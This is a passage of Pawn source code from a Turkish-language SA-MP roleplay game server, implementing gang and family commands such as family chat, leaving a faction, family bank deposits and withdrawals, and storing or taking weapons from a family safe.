	if(PlayerInfo[playerid][pGang] == 255) return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmen için bir ailede olman gerek.");
	new vstring[1024];
	for(new i = 0; i < MAX_GANG_VEHICLES; i++)
	{
		if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId] != INVALID_VEHICLE_ID)
		{
		    if(PlayerInfo[playerid][pAdmin] >= 2)
		    {
		        format(vstring, sizeof(vstring), "%s\n%s (ID: %d)", vstring, VehicleName[FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvModelId] - 400], FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvId]);
		    }
		    else
		    {
				format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvModelId] - 400]);
			}
		}
		else if(FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvImpounded] == 1) {
			format(vstring, sizeof(vstring), "%s\n%s (baglanmis)", vstring, VehicleName[FamilyVehicleInfo[PlayerInfo[playerid][pGang]][i][fvModelId] - 400]);
		}
		else
		{
			format(vstring, sizeof(vstring), "%s\nYok", vstring);
		}
	}
	return ShowPlayerDialogEx(playerid, GTRACKCAR, DIALOG_STYLE_LIST, "Araç GPS Takibi", vstring, "Takipet", "Iptal");
}

CMD:ailechatkapat(playerid, params[])
{
	return cmd_fkapat(playerid, params);
}

CMD:yeniliklerkapat(playerid, params[])
{
	if(!gNews[playerid])
	{
		gNews[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "Haberler kanalýný pasif hale getirdin.");
	}
	else
	{
		gNews[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "Haberler kanalýný aktif hale getirdin.");
	}
	return 1;
}

CMD:newbiekapat(playerid, params[])
{
	if(!gNewbie[playerid])
	{
		gNewbie[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "Newbie kanalýný pasif hale getirdin.");
	}
	else
	{
		gNewbie[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "Newbie kanalýný aktif hale getirdin.");
	}
	return 1;
}

CMD:fkapat(playerid, params[])
{
	if(!gFam[playerid])
	{
		gFam[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "Aile kanalýný pasif hale getirdin.");
	}
	else
	{
		gFam[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "Aile kanalýný aktif hale getirdin.");
	}
	return 1;
}

CMD:f(playerid, params[]) {
	if(gFam[playerid] == 1)
		return SendClientMessage(playerid, TEAM_CYAN_COLOR, "Aile kanalýný /fkapat yazarak kapattýn.");

	new string[128];

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: (/f)[aile chati]");

	if(PlayerCuffed[playerid] > 0 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_GREY, "Kelepçeli,tazerlenmiþ yada hastanede yatarken /f'den konuþamazsýn.");

	if((PlayerInfo[playerid][pFaction] == 4) || PlayerInfo[playerid][pGang] < 255) {
		new member = PlayerInfo[playerid][pFaction];
		new fam = PlayerInfo[playerid][pGang];
		if(member==4) {
			if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (6) Director %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (5) Vice Director %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (4) Special Agent %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (3) Agent %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (2) Marksman %s: %s **", GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (1) Freelancer %s: %s **", GetPlayerNameEx(playerid), params); }
			else { format(string, sizeof(string), "** (1) Freelancer %s: %s **", GetPlayerNameEx(playerid), params); }
			SendFamilyMessage(PlayerInfo[playerid][pFaction], TEAM_AZTECAS_COLOR, string);
		}
		else if(PlayerInfo[playerid][pGang] < 255) {
			if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "** (6) %s %s: %s **", FamilyInfo[fam][FamilyRank6], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "** (5) %s %s: %s **", FamilyInfo[fam][FamilyRank5], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "** (4) %s %s: %s  **", FamilyInfo[fam][FamilyRank4], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "** (3) %s %s: %s  **", FamilyInfo[fam][FamilyRank3], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "** (2) %s %s: %s  **", FamilyInfo[fam][FamilyRank2], GetPlayerNameEx(playerid), params); }
			else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "** (1) %s %s: %s  **", FamilyInfo[fam][FamilyRank1], GetPlayerNameEx(playerid), params); }
			else { format(string, sizeof(string), "** (0) %s %s: %s **", FamilyInfo[fam][FamilyRank1], GetPlayerNameEx(playerid), params); }
			SendNewFamilyMessage(PlayerInfo[playerid][pGang], TEAM_AZTECAS_COLOR, string);
		}
		return 1;
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Bir aileden deðilsin.");

	return 1;
}

CMD:olusumdancik(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] >= 1 || PlayerInfo[playerid][pLeader] >= 1) {
		SendClientMessage(playerid, COLOR_LIGHTBLUE,"* Oluþumdan çýktýn, artýk bir sivilsin.");
		new string[128];
		format(string, sizeof(string), "%s, %s oluþumundan rütbe %i'ken çýktý.", GetPlayerNameEx(playerid), GetFactionName(PlayerInfo[playerid][pFaction]), PlayerInfo[playerid][pRank]);
		Log("logs/faction.log", string);
		PlayerInfo[playerid][pFaction] = 0;
		PlayerInfo[playerid][pRank] = 0;
		PlayerInfo[playerid][pDuty] = 0;
		PlayerInfo[playerid][pLeader] = 0;
		PlayerInfo[playerid][pDivision] = 0;
		if(!IsValidSkin(GetPlayerSkin(playerid))) {
  			new rand = random(sizeof(CIV));
			SetPlayerSkin(playerid,CIV[rand]);
			PlayerInfo[playerid][pSkin] = CIV[rand];
		}
		SetPlayerToTeamColor(playerid);
		player_remove_vip_toys(playerid);
   		pTazer[playerid] = 0;
		if(TalkingLive[playerid] != INVALID_PLAYER_ID || LiveOffer[playerid] != INVALID_PLAYER_ID ) {
			TalkingLive[TalkingLive[playerid]] = INVALID_PLAYER_ID;
			TalkingLive[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[TalkingLive[playerid]] = INVALID_PLAYER_ID;
		}
		TalkingLive[playerid] = INVALID_PLAYER_ID;
		LiveOffer[playerid] = INVALID_PLAYER_ID;
		Backup[playerid] = 0;
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bir oluþumda deðilsin.");
	return 1;
}

CMD:ailedencik(playerid, params[]) {
	return cmd_ailedenayril(playerid, params);
}

CMD:ailedenayril(playerid, params[])
{
    if(PlayerInfo[playerid][pGang] != 255)
	{
		for (new x = 0; x < MAX_POINTS; x++)
		{
			if(Points[x][ClaimerId] == playerid)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Point esnasýnda aileden çýkamazsýn.");
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Aileden çýktýn, artýk bir sivilsin.");
		new string[128];
		format(string, sizeof(string), "%s, %d ailesinden rütbe %i olarak çýktý.", GetPlayerNameEx(playerid), PlayerInfo[playerid][pGang]+1, PlayerInfo[playerid][pRank]);
		Log("logs/family.log", string);
		PlayerInfo[playerid][pGang] = 255;
		PlayerInfo[playerid][pRank] = 0;
		if(!IsValidSkin(GetPlayerSkin(playerid)))
		{
		    new rand = random(sizeof(CIV));
			SetPlayerSkin(playerid,CIV[rand]);
			PlayerInfo[playerid][pSkin] = CIV[rand];
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
	}
	return 1;
}

CMD:ailekasayardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________");
	SendClientMessage(playerid, COLOR_WHITE, "KASA YARDIM: Daha fazla bilgi için bir komut yaz.");
	SendClientMessage(playerid, COLOR_WHITE, "KASA: /ailekasadurumu /akasayakoy /akasadanal /asilahsakla /asilahal.");
	return 1;
}

CMD:ailekasadurumu(playerid, params[]) {
	if(PlayerInfo[playerid][pGang] < 255) {
		if(FamilyInfo[PlayerInfo[playerid][pGang]][FamilyUSafe] < 1) {
			SendClientMessage(playerid, COLOR_GRAD1, "Ailenin bir kasasý yok.");
		}
		else
		{
			new string[128];

			new weaponsinlocker;
			for(new s = 0; s < 10; s++)
			{
				if(FamilyInfo[PlayerInfo[playerid][pGang]][FamilyGuns][s] != 0)
				{
					weaponsinlocker++;
				}
			}

			format(string, sizeof(string), " Kasa: %s | Silah dolaplarý: %d/10 | Nakit: $%d | Pot: %d | Crack: %d | Materyal: %d", FamilyInfo[PlayerInfo[playerid][pGang]][FamilyName], weaponsinlocker, FamilyInfo[PlayerInfo[playerid][pGang]][FamilyCash], FamilyInfo[PlayerInfo[playerid][pGang]][FamilyPot], FamilyInfo[PlayerInfo[playerid][pGang]][FamilyCrack], FamilyInfo[PlayerInfo[playerid][pGang]][FamilyMats]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
	return 1;
}

CMD:aileler(playerid, params[])
{
	new string[128], familyid;

	if(sscanf(params, "d", familyid))
	{
		new number = 0;
		for(new i = 0; i < sizeof(FamilyInfo); i++)
		{
			number ++;
			format(string, sizeof(string), "Aile %d | Ýsim: %s | Lider: %s | Üyeler: %d",number,FamilyInfo[i][FamilyName],FamilyInfo[i][FamilyLeader],FamilyInfo[i][FamilyMembers]);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		return 1;
	}

	if(familyid < 1 || familyid > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "Aile slotu 1 ile 14 arasý olmalýdýr."); return 1; }
	familyid -= 1;
	if(FamilyInfo[familyid][FamilyTaken] != 1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu aile slotu boþ.");
		return 1;
	}
	foreach(Player, i)
	{
		if(PlayerInfo[i][pGang] == familyid && (AdminDuty[i] != 1))
		{
			if(PlayerInfo[i][pRank] == 1)
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s (1).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank1]);
			}
			else if(PlayerInfo[i][pRank] == 2)
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s (2).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank2]);
			}
			else if(PlayerInfo[i][pRank] == 3)
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s (3).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank3]);
			}
			else if(PlayerInfo[i][pRank] == 4)
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s (4).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank4]);
			}
			else if(PlayerInfo[i][pRank] == 5)
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s (5).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank5]);
			}
			else if(PlayerInfo[i][pRank] == 6)
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s (6).",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank6]);
			}
			else
			{
				format(string, sizeof(string), "* %s: %s | Rütbe: %s.",FamilyInfo[familyid][FamilyName],GetPlayerNameEx(i),FamilyInfo[familyid][FamilyRank1]);
			}
			SendClientMessage(playerid, COLOR_GREY, string);
		}
	}
	return 1;
}

CMD:akasadurum(playerid, params[])
{
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}

	new family, string[128];
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}

	format(string, sizeof(string), "Ailenin banka hesabýnda $%d para var.", FamilyInfo[family][FamilyBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:aileyeparayatir(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}

	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aileyeparayatir [amount]");
		format(string, sizeof(string), "Ailenin banka hesabýnda $%d para var.", FamilyInfo[family][FamilyBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > GetPlayerCash(playerid) || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "O kadar crackin yok.");
		return 1;
	}
	GivePlayerCash(playerid,-amount);
	new curfunds = FamilyInfo[family][FamilyBank];
	FamilyInfo[family][FamilyBank]=amount+FamilyInfo[family][FamilyBank];
	SendClientMessage(playerid, COLOR_WHITE, "|___ AILENIN BANKA DURUMU ___|");
	format(string, sizeof(string), "  Eski bakiye: $%d", curfunds);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "  Yatirilan: $%d",amount);
	SendClientMessage(playerid, COLOR_GRAD4, string);
	SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
	format(string, sizeof(string), " Yeni bakiye: $%d", FamilyInfo[family][FamilyBank]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	new ip[32];
	GetPlayerIp(playerid, ip, sizeof(ip));
	format(string,sizeof(string),"%s (IP: %s) has deposited $%d into family %d's bank account.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
	Log("logs/family.log", string);
	return 1;
}

CMD:aparacek(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}
	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}
	if(PlayerInfo[playerid][pRank] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Aile bankasýný yalnýzca R5 ve üstü kullanabilir.");
		return 1;
	}

	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aparacek [miktar]");
		format(string, sizeof(string), "Ailenin banka hesabýnda $%d para var.", FamilyInfo[family][FamilyBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > FamilyInfo[family][FamilyBank] || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Ailende bu kadar yok.");
		return 1;
	}

	GivePlayerCash(playerid,amount);
	FamilyInfo[family][FamilyBank]=FamilyInfo[family][FamilyBank]-amount;
	format(string, sizeof(string), "  Ailenin banka hesabýndan $%d para aldýn. Toplam: $%d", amount,FamilyInfo[family][FamilyBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	new ip[32];
	GetPlayerIp(playerid, ip, sizeof(ip));
	format(string,sizeof(string),"%s (IP: %s) $%d parayý %d. ailenin banka hesabýndan aldý.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
	Log("logs/family.log", string);
	return 1;
}

CMD:asilahsakla(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken") != 0)
 	{
		SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");
		return 1;
	}
	/*if(PlayerInfo[playerid][pDonator] > 2)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't give away weapons if you're Gold+ VIP!");
		return 1;
	}*/
	if(IsPlayerInAnyVehicle(playerid))
 {
		SendClientMessage (playerid, COLOR_GRAD2, "Araçtayken silah koyamazsýn.");
		return 1;
	}
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(health < 80)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Canýn 80'in altýndayken silah koyamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0||GetPlayerState(playerid) == 7)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pFaction] > 0)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir oluþumdayken silahlarýný aile kasasýna koyamazsýn.");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Aile kasasýna yakýn deðilsin.");
		return 1;
	}

	new string[128], weaponchoice[32], slot;
	if(sscanf(params, "s[32]d", weaponchoice, slot)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /asilahsakla [silah] [slot]");


	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
	{
		format(string, sizeof(string), "   Baþka bir silah koymadan önce %d saniye beklemelisin.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	if(slot < 1 || slot > 10)
	{
		SendClientMessage(playerid, COLOR_GREY, "Yanlýþ slot.");
		return 1;
	}

	if(FamilyInfo[family][FamilyGuns][slot-1] != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Ailenin bu slotta zaten baþka bir silahý var.");
		return 1;
	}

	new weapon;
	if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Susturuculu tabancaný silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s Susturuculu tabancasýný kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Desert Eagle'ni silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s Desert Eagle'ýný kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shotgun'unu silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s Shotgun'unu kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "SPAS-12'ni silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s SPAS-12'sini kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "MP5'ini silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][4];
			format(string,sizeof(string), "* %s MP5'ini kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "AK47'ni silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s AK-47'sini kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "M4'ünü silah dolabnýa koydun.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s M4'ünü kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Rifle'ni silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s Rifle'sini kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sniper Rifle'ni silah dolabýna koydun.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s Sniper Rifle'sini kasaya koydu.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else { SendClientMessage(playerid,COLOR_GREY,"Yanlýþ silah adý!"); return 1; }
	if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin.");
	if(FamilyInfo[family][FamilyGuns][slot-1] == 0)
	{
		FamilyInfo[family][FamilyGuns][slot-1] = weapon;
		RemovePlayerWeapon(playerid, weapon);
		SaveFamilies();
		return 1;
	}
	return 1;
}

CMD:asilahal(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	new string[128], slot;

	if(PlayerInfo[playerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "Silah taþýman yasaklandýðýndan dolayý bunu kullanamazsýn!");

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bir ailede deðilsin.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Aile kasasýna yakýn deðilsin.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Araçtan silahlar alamazsýn.");
		return 1;
	}

	if(sscanf(params, "d", slot))
	{
		new weaponname[50];
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		format(string, sizeof(string), "*** %s Kasa ***", FamilyInfo[family][FamilyName]);
		SendClientMessage(playerid, COLOR_WHITE, string);
		for(new s = 0; s < 10; s++)
		{
			if(FamilyInfo[family][FamilyGuns][s] != 0)
			{
				GetWeaponName(FamilyInfo[family][FamilyGuns][s], weaponname, sizeof(weaponname));
				format(string, sizeof(string), "Slot %d: %s", s+1, weaponname);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /asilahal [slot]");
		return 1;
	}

	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
	{
		format(string, sizeof(string), "Silah dolabýndan baþka bir silah çýkarmak için %d saniye beklemen gerek.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	if(slot < 1 || slot > 10)
	{
		SendClientMessage(playerid, COLOR_GREY, "Yanlýþ slot.");
		return 1;
	}

	if(PlayerInfo[playerid][pRank] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Aile kasasýndan yalnýzca R4 ve üzeri silah alabilir.");
		return 1;
	}
	if(FamilyInfo[family][FamilyGuns][slot-1] != 0)
	{
		new weaponname[50];
		GetWeaponName(FamilyInfo[family][FamilyGuns][slot-1], weaponname, sizeof(weaponname));
